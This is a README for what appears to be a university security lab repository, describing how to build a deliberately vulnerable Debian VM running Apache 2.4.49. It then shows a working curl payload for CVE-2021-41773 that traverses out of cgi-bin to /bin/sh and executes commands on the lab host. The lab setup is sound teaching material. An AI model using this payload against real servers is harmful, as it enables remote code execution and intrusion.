# Files in this repo

## setup.sh

This file is intended to be executed as root on the guest VM. Do not run it on your host OS; it will do bad things.

This script will:
* Install sudo, build-essential, and the build dependencies for apache2
* Add user `abronsius` to the sudoers list
* Download, build, and install apache2 2.4.49 at `/home/abronsius/apache2`
* Configure apache2 to serve files and enable cgi-bin
* ... more coming later

# VM OS

The OS is Debian 11.1 Bullseye but any Debian-based OS should also work. I don't recommend deviating from this choice in case there are compatibility issues, and any non-Debian OS will require installing and configuring everything manually. Download via [Torrent](https://cdimage.debian.org/debian-cd/current/amd64/bt-cd/debian-11.1.0-amd64-netinst.iso.torrent) or directly via [ISO](https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-11.1.0-amd64-netinst.iso). The sha256sum of the ISO is `8488abc1361590ee7a3c9b00ec059b29dfb1da40f8ba4adf293c7a30fa943eb2` to double check that you've obtained the correct file.

# VM Configuration

The VM can be installed using any software (qemu/kvm, VirtualBox, VMWare, etc.)
The only requirement is network access with its own IP address. This can (and should) be a totally local network. The VM will contain several serious security flaws and therefore should not be available over the Internet.

The scripts are hardcoded to assume there is a user named `abronsius`, so be sure to create such a user either when installing the OS or afterward.

# Exploits

## Exploit Target 1: Apache

### Exploit 1: CVE-2021-41773

This vulnerability is trivial to exploit and results in directory traversal, local file inclusion, and remote code execution. This exploit takes advantage of a new form of URL normalisation added in this version which did not appropriately check against URL-encoded paths, which in this instance allows moving up from the cgi-bin directory and executing arbitrary code on the remote server. This line brings the directory up to `/` and then executes `/bin/sh` and passes `echo;ls;whoami;uname -a` to the opened shell.

Directory traveral/local file inclusion:
```sh
curl --path-as-is "http://website1.cpsc4270.foul.dev/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo;ls;whoami;uname -a"
```
